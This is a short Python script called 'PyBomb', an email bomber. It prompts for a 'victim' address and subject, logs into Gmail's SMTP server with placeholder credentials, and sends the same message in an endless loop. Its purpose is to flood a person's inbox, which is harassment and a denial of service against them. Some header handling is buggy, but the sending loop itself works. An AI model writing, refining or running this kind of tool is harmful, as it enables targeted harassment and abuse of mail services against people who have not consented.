import smtplib
from email.mime.text \
import MIMEText
import winsound
your_mail,your_password="yourmailadress@gmail.com",'yourpassword'
print("""
PPPPPP          BBBBB                      bb      
PP   PP yy   yy BB   B   oooo  mm mm mmmm  bb      
PPPPPP  yy   yy BBBBBB  oo  oo mmm  mm  mm bbbbbb  
PP       yyyyyy BB   BB oo  oo mmm  mm  mm bb   bb 
PP           yy BBBBBB   oooo  mmm  mm  mm bbbbbb  
         yyyyy 				Created By ErdiBgr \n""")
victimMail,subject = input('Mail Adress: '),input('Subject: ')
message = """
*-*-*-*-*-*-*-*-*-*-*-*-*-* <br>
Messages Here <br>
*-*-*-*-*-*-*-*-*-*-*-*-*-*
"""
mail = MIMEText(message, "html", "utf-8")
mail["From"] = victimMail
mail["Subject"] = subject
mail["To"] = ",".join(victimMail)
mail = mail.as_string()
try:
    server = smtplib.SMTP('smtp.gmail.com:587') 
    server.starttls() 
    server.login(your_mail, your_password)   
    while True:
    	server.sendmail(your_mail, victimMail, mail) 
    	print ('Successful!')
    	winsound.Beep(100,100)
except KeyboardInterrupt:
	print("Unsuccessful!")
